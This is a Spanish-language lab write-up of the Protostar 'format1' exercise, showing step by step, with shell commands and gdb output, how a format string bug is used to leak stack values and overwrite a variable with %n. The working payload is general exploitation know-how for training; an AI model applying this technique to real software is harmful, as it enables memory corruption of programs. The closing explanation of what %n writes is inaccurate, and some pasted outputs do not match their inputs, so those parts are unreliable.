
---------------------------------------------------------------------------
## Sobreescribir una variable -> [format1](https://exploit.education/protostar/format-one/)

Este binario toma un argumento (al que llama "string"), lo mete en la funcion **printf()** y te imprime dicho argumento

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA
AAA[user@protostar]-[/opt/protostar/bin]:$ 
```
 Como no hace un salto de linea, lo ponemos nosotros concatenando "; echo"
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 AAA; echo
AAA
[user@protostar]-[/opt/protostar/bin]:$ 
```
 ¿Si en vez de pasarle una "A" le pasamos una cadena de formateo como %x (numero hexadecimal)?
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 %x; echo
804960c
[user@protostar]-[/opt/protostar/bin]:$ ./format1 "%x %x"; echo
804960c bffff6e8
```
 Este "bffff6e8" parece una direccion de la pila... Vamos a mirar en gdb, poniendo un breakpoint en una funcion cuaqluiera (prinff())
 para ver como es la pila con datos.
 
```console
[user@protostar]-[/opt/protostar/bin]:$ python -c "print('%x'*4)"  > /tmp/pattern
[user@protostar]-[/opt/protostar/bin]:$ gdb ./format1
(gdb) disas vuln
0x080483f4 <vuln+0>:	push   %ebp
...
0x080483fd <vuln+9>:	mov    %eax,(%esp)
0x08048400 <vuln+12>:	call   0x8048320 <printf@plt>
...
0x0804841a <vuln+38>:	leave  
0x0804841b <vuln+39>:	ret    
(gdb) b *0x08048400
(gdb) run < /tmp/pattern
Starting program: /opt/protostar/bin/format1 < /tmp/pattern
Breakpoint 4, 0x08048400 in vuln (string=0x0) at format1/format1.c:10
(gdb) x/8wx $esp
0xbffff670:	0x00000000	0x0804960c	0xbffff6a8	0x08048469
0xbffff680:	0xb7fd8304	0xb7fd7ff4	0xbffff6a8	0x08048435	
```
    
Como podemos ver la segunda entrada de la pila es nuestro "0x0804960c" que se imprimió antes, es decir, prinf(%x) imprime contenido de la pila.

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*150 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
3174616d
41414100
42424241
7838252e
7838252e
```
   Nos está imrpimiendo muchos valores de la pila, en cierto momento, se ven "41" y "42", que equivalen a nuestras "A" y "B", seguidos de "7838252e"
   que son nuestras "%8x.". El objetivo, esque sean las A los útlimos valores que salgan, para eso hay que reducir las x u offset.
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'BBBB'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
726f662f
3174616d
41414100
42424241
```
   El problema esque se han mezclado los 42 y los 41 (A)s y (B)s, y tiene que quedar perfecto, asi que se reduce el numero de "B"

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*138 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
41414141
78382542
7838252e
7838252e
7838252e
```
  Se quitan mas "x"

```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('AAAA'+'B'+'%8x.'*168 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
2f2e0000
6d726f66
317461
41414141
```
  Perfecto, ya están alineados nuestras, "A". Pero ahora lo que interesa es cambiar esas "A" por otra cosa, la direccion de la varaible 
  que queremos modificar:
```console
[user@protostar]-[/opt/protostar/bin]:$ objdump -t ./format1 | grep "target"
08049638 g     O .bss	00000004              target
```
  La direccion de la variable "target" es *0x08049638* que si lo pasamos a endian (dar la vuelta a los bytes) sale -> *\x38\x96\x04\x08*
  Ahora sustituimos las "AAAA" por esa dirección (ambas cosas ocupan 4 bytes).
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%x')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
317461
8049638
```
  Perfecto, la dirección de memoria se ha alineado perfectamente. Ahora hay que sobrrescribirla cambiando la "%x" por "%n"
  
```console
[user@protostar]-[/opt/protostar/bin]:$ ./format1 $(python -c "print('\x38\x96\x04\x08'+'B'+'%8x.'*136 + '%n')") | tr "." "\n" ;echo
AAAABBBB 804960c
bffff488
...
317461
you have modified the target :)
```
  Y ya está, primer format completado.
  **Entonces. ¿Que hemos hecho con todo esto?** Primero hemos observado el binario, la pila... Hemos visto que nos imprimía valores de esta al pasarle
  "%x" y que a cierto numero de estos, se muestra nuestro input. 
  Hemos sustituido un input random "AAAA" por la direccion de una varaible (target = \x38\x96\x04\x08)
  La hemos colocado al final y hemos escrito en ella con "%n". 
  Es decir gracias a "%n" podemos escribir dentro de una direccion de memoria que pongamos en la pila. (gracias a que esta actua como puntero).
  
  **¿Que hemos escrito en la varaible target?** La "B"
  
  **Y si en vez de una direccion de memoria válida hubieramos metido las "AAAA"?** Que %n diria de escribir en una memoria que no existe en (0x41414141)
  no hay nada. Entonces arrojaría un segmentation fault.
  
  **A nivel de código que hemos hecho?** Exactamente esto ->  ```printf("AAAA%n", &variable) -> varaible = "AAAA"```
  
    
   
